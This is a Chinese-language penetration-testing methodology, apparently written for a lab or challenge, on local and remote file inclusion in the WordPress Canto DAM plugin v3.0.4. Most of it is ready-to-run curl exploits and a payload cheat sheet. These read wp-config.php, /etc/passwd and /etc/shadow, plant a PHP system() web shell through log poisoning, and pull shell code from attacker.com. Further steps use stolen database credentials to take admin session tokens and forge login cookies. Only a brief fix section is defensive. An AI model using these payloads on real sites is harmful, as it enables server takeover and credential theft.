# WordPress Canto 插件 LFI 与认证绕过攻击方法论

## 1. 技术介绍

### 1.1 漏洞原理

WordPress Canto DAM 插件 v3.0.4 的 6 个 PHP 库文件存在严重的本地文件包含（LFI）漏洞。这些文件接受用户可控的 `wp_abspath` 或 `abspath` 参数，直接将其拼接到 `require_once()` 语句中，导致攻击者可以包含任意文件。

**漏洞本质：** 应用层代码将用户输入作为文件路径执行，违背了"不信任用户输入"的安全原则。

### 1.2 受影响组件

| 文件路径 | 漏洞参数 | 危险代码行 | HTTP 方法 |
|---------|---------|-----------|---------|
| `/wp-content/plugins/canto/includes/lib/get.php` | `wp_abspath` | 第 5 行 | GET/POST |
| `/wp-content/plugins/canto/includes/lib/download.php` | `wp_abspath` | 第 5 行 | GET/POST |
| `/wp-content/plugins/canto/includes/lib/detail.php` | `wp_abspath` | 第 3 行 | GET/POST |
| `/wp-content/plugins/canto/includes/lib/tree.php` | `wp_abspath` | 第 5 行 | GET/POST |
| `/wp-content/plugins/canto/includes/lib/sizes.php` | `abspath` | 第 15, 18 行 | GET/POST |
| `/wp-content/plugins/canto/includes/lib/copy-media.php` | `abspath` | 第 55, 58 行 | POST |

### 1.3 漏洞代码模式

```php
// 漏洞代码示例 (get.php 第 5 行)
require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');

// 漏洞代码示例 (sizes.php 第 15, 18 行)
require_once(urldecode($_REQUEST["abspath"]) . 'wp-admin/admin.php');
require_once($_REQUEST["abspath"] . 'wp-admin/includes/image.php');
```

---

## 2. 攻击场景

### 2.1 直接文件读取

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **配置文件读取** | 读取 wp-config.php | 获取数据库凭证、盐值、密钥 |
| **源码泄露** | 读取插件/主题 PHP 文件 | 获取业务逻辑、硬编码密钥 |
| **日志文件读取** | 读取 Apache/Nginx 日志 | 结合日志注入实现 RCE |
| **系统文件读取** | 读取 /etc/passwd | 获取系统用户信息 |

### 2.2 远程文件包含（RFI）

当 `allow_url_include=On` 时：

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **远程代码执行** | 包含攻击者控制的 PHP 文件 | 执行任意 PHP 代码 |
| **Webshell 上传** | 包含远程 shell.php | 建立持久化后门 |
| **反向 Shell** | 包含反向 Shell 脚本 | 获取服务器控制权 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 基础 LFI 探测

```bash
# 测试基本 LFI 功能
curl -i "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html"

# 如果返回 WordPress 管理页面内容，说明 LFI 成功
```

#### 3.1.2 路径遍历探测

```bash
# 测试路径遍历
curl -i "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=../../../../../../etc"

# 测试绝对路径
curl -i "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00"
```

#### 3.1.3 远程文件包含探测

```bash
# 测试 RFI（需要 allow_url_include=On）
curl -i "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.txt?"

# 注意：? 用于截断后面的 .php 扩展名
```

### 3.2 白盒测试

#### 3.2.1 代码审计

```bash
# 搜索 require_once 与用户输入的组合
grep -rn "require_once.*\$_REQUEST\[" wp-content/plugins/canto/
grep -rn "require_once.*\$_GET\[" wp-content/plugins/canto/
grep -rn "require_once.*\$_POST\[" wp-content/plugins/canto/

# 搜索 include/require 与用户输入的组合
grep -rn "include.*\$_" wp-content/plugins/canto/
grep -rn "require.*\$_" wp-content/plugins/canto/
```

---

## 4. 漏洞利用方法

### 4.1 敏感文件读取

#### 4.1.1 WordPress 配置文件

```bash
# 读取 wp-config.php 获取数据库凭证
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&token=x"

# 响应包含：
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wp_user');
# define('DB_PASSWORD', 'ThisIsNotPartOfTheChallenge!');
# define('DB_HOST', '127.0.0.1');
```

#### 4.1.2 系统文件读取

```bash
# 读取 /etc/passwd
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00&subdomain=test&app_api=x&token=x"

# 读取 /etc/shadow（需要 root 权限）
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/shadow%00&subdomain=test&app_api=x&token=x"

# 读取 Apache 日志
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/log/apache2/access.log%00&subdomain=test&app_api=x&token=x"
```

#### 4.1.3 源码泄露

```bash
# 读取 Canto 插件源码
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-content/plugins/canto/includes/class-canto-settings.php&subdomain=test&app_api=x&token=x"

# 读取 WordPress 核心文件
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-includes/pluggable.php&subdomain=test&app_api=x&token=x"
```

### 4.2 远程代码执行

#### 4.2.1 日志注入 + LFI

```bash
# 步骤 1：在 Apache 日志中注入 PHP 代码
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=test&subdomain=x&app_api=y&token=z"

# 步骤 2：通过 LFI 包含日志文件执行代码
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/log/apache2/access.log%00&subdomain=x&app_api=y&token=z&cmd=id"
```

#### 4.2.2 远程文件包含 RCE

```bash
# 步骤 1：在攻击者服务器上创建恶意 PHP 文件
# attacker.com/shell.txt 内容：
<?php system($_GET['cmd']); ?>

# 步骤 2：通过 RFI 执行代码（需要 allow_url_include=On）
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.txt?&subdomain=x&app_api=y&token=z&cmd=id"
```

#### 4.2.3 数据驱动 RCE（copy-media.php）

```bash
# copy-media.php 包含多阶段 SSRF 链，可写入文件到服务器
curl -X POST "http://target/wp-content/plugins/canto/includes/lib/copy-media.php" \
  -d "abspath=/var/www/html&fbc_flight_domain=attacker&fbc_app_api=.com&fbc_scheme=api&fbc_id=v1&fbc_app_token=test&post_id=1"

# 攻击者服务器返回恶意 JSON，包含内网 URL
# {
#   "url": {
#     "download": "http://attacker.com/malicious.php"
#   }
# }

# 文件被下载并上传到 WordPress 媒体库
```

### 4.3 认证绕过

#### 4.3.1 空字节注入绕过

```bash
# 使用%00 截断后面的路径
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html%00&subdomain=x&app_api=y&token=z"

# 在 PHP < 5.3.4 版本有效
```

#### 4.3.2 路径遍历绕过

```bash
# 使用相对路径遍历
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=../../../../../../tmp&subdomain=x&app_api=y&token=z"

# 如果 /tmp 存在恶意 PHP 文件，可被包含执行
```

---

## 5. 绕过方法

### 5.1 绕过文件扩展名限制

#### 5.1.1 空字节截断

```bash
# PHP < 5.3.4 支持%00 截断
wp_abspath=/var/www/html/shell.php%00

# 实际执行：require_once("/var/www/html/shell.php")
```

#### 5.1.2 问号截断

```bash
# 使用？截断后面的扩展名
wp_abspath=http://attacker.com/shell.txt?

# 实际执行：require_once("http://attacker.com/shell.txt?.php")
# PHP 忽略？后面的内容
```

### 5.2 绕过路径过滤

#### 5.2.1 双 URL 编码

```bash
# 双 URL 编码绕过路径检查
wp_abspath=%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 解码后：/../../../etc/passwd
```

#### 5.2.2 混合路径表示

```bash
# 使用 Windows 风格路径
wp_abspath=C:\..\..\..\..\..\..\..\..\..\..\etc\passwd

# 使用混合斜杠
wp_abspath=/var\\www\\html/../../../etc/passwd
```

### 5.3 结合其他漏洞

#### 5.3.1 LFI + XSS 链

```
1. 通过 LFI 读取 WordPress 数据库凭证
2. 连接数据库获取管理员会话 token
3. 使用管理员权限注入 XSS payload
4. 窃取其他用户会话
```

#### 5.3.2 LFI + SSRF 链

```
1. 通过 SSRF 读取内网服务响应
2. 响应包含文件路径信息
3. 使用 LFI 读取该文件
4. 获取敏感数据
```

---

## 6. 渗透测试决策流程

```
开始 LFI 测试
    │
    ▼
识别文件包含点
    │
    ├── 参数名为 path/file/include/abspath
    ├── 参数参与 require/include 调用
    └── 响应包含文件内容
    │
    ▼
验证 LFI 存在性
    │
    ├── 包含已知文件（/etc/passwd）
    ├── 包含自身文件（检测递归）
    └── 分析错误消息
    │
    ▼
确定 LFI 类型
    │
    ├── 本地文件包含
    │   ├── 读取敏感文件
    │   ├── 日志注入
    │   └── 结合其他漏洞
    │
    └── 远程文件包含（allow_url_include=On）
        ├── 远程代码执行
        ├── Webshell 上传
        └── 反向 Shell
    │
    ▼
深度利用
    │
    ├── 读取数据库凭证
    ├── 读取会话 token
    ├── 读取源码
    └── 实现 RCE
```

---

## 7. 常用 Payload 速查表

| 类别 | 目标/环境 | Payload 示例 | 说明 |
|-----|---------|------------|------|
| **基础 LFI** | Linux 系统 | `wp_abspath=/etc/passwd%00` | 读取 /etc/passwd |
| **基础 LFI** | WordPress | `wp_abspath=/var/www/html/wp-config.php` | 读取数据库配置 |
| **基础 LFI** | Apache 日志 | `wp_abspath=/var/log/apache2/access.log%00` | 读取日志文件 |
| **RFI** | 远程 Shell | `wp_abspath=http://attacker.com/shell.txt?` | 需要 allow_url_include=On |
| **路径遍历** | 相对路径 | `wp_abspath=../../../../../../etc/passwd` | 遍历到根目录 |
| **空字节截断** | PHP < 5.3.4 | `wp_abspath=/etc/passwd%00` | 截断扩展名 |
| **日志注入** | Apache | User-Agent: `<?php system($_GET['cmd']); ?>` | 注入 PHP 代码 |
| **编码绕过** | 双 URL 编码 | `wp_abspath=%252f%252e%252e%252fetc%252fpasswd` | 绕过过滤 |

---

## 8. WordPress 特定场景

### 8.1 结合 WordPress 认证机制

```bash
# 1. 通过 LFI 读取 wp-config.php 获取数据库凭证
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php&subdomain=x&app_api=y&token=z"

# 2. 使用凭证连接 MySQL 数据库
mysql -h 127.0.0.1 -u wp_user -p'ThisIsNotPartOfTheChallenge!' wordpress

# 3. 查询管理员会话 token
SELECT meta_value FROM wp_usermeta WHERE meta_key = 'session_tokens';

# 4. 构造认证 Cookie
# wordpress_logged_in_[hash]=admin|expiration|token|hmac
```

### 8.2 结合 WordPress 插件架构

```bash
# Canto 插件直接文件访问绕过 WordPress 路由
# 正常 WordPress 插件应通过 admin-ajax.php 或 REST API 访问
# Canto 插件允许直接访问 PHP 文件

# 攻击路径：
# 1. 直接访问 /wp-content/plugins/canto/includes/lib/get.php
# 2. 提供 wp_abspath 参数包含 WordPress 核心
# 3. 绕过 WordPress 认证检查
# 4. 执行任意操作
```

---

## 9. 防御建议

### 9.1 代码层修复

```php
// 使用 ABSPATH 常量代替用户输入
require_once(ABSPATH . 'wp-admin/admin.php');

// 如果必须使用用户输入，进行严格验证
$allowed_paths = ['/var/www/html', '/usr/share/wordpress'];
$user_path = realpath($_REQUEST['wp_abspath']);

$is_allowed = false;
foreach ($allowed_paths as $allowed) {
    if (strpos($user_path, $allowed) === 0) {
        $is_allowed = true;
        break;
    }
}

if (!$is_allowed) {
    wp_die('Invalid path');
}
```

### 9.2 配置层修复

```ini
; php.ini 配置
allow_url_include = Off
open_basedir = /var/www/html
display_errors = Off
```

---

**文档版本：** 1.0  
**最后更新：** 2025-10-29  
**适用目标：** WordPress Canto DAM 插件 v3.0.4  
**关联漏洞：** AUTHZ-VULN-01 至 AUTHZ-VULN-05
